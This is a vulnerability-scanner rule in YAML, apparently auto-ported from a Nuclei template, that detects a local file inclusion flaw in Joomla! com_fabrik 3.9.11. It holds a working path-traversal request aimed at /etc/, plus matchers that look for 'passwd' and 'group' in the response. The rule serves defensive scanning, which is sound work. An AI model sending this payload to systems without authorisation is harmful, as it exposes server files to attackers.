schema_version: 1
id: "cortex.community:joomla-com-fabrik-lfi"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Joomla! com_fabrik 3.9.11 - Local File Inclusion"
  description: "Joomla! com_fabrik 3.9.11 is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.exploit-db.com/exploits/48263"
  cwes: [22]
  tags: ["joomla", "lfi", "edb", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../etc/" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "\"value\":\"passwd\"" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "\"value\":\"group\"" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "\"disable\":false" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
